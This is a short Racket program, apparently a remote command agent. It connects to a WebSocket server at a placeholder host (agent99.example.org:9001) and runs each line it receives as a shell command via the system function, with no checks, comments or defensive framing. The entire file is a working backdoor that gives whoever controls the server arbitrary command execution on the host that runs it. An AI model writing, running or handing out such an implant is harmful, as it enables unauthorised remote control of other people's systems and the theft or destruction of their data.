#lang racket
(define wsurl "ws://agent99.example.org:9001")
(require net/websocket/client)
(require net/url)

(define (handle line)
  (displayln (string-append ">> " line))
  (system line))

(define (start-client url)
  (define-values (sock) (ws-connect url))
  (let mainloop ()
    (let ((line (ws-recv sock)))
      (if (eof-object? line)
          (exit)
          (handle line)
      )

    )
  (mainloop)
)
)

(define (main argv)
    (start-client (string->url wsurl))
)

(main '())



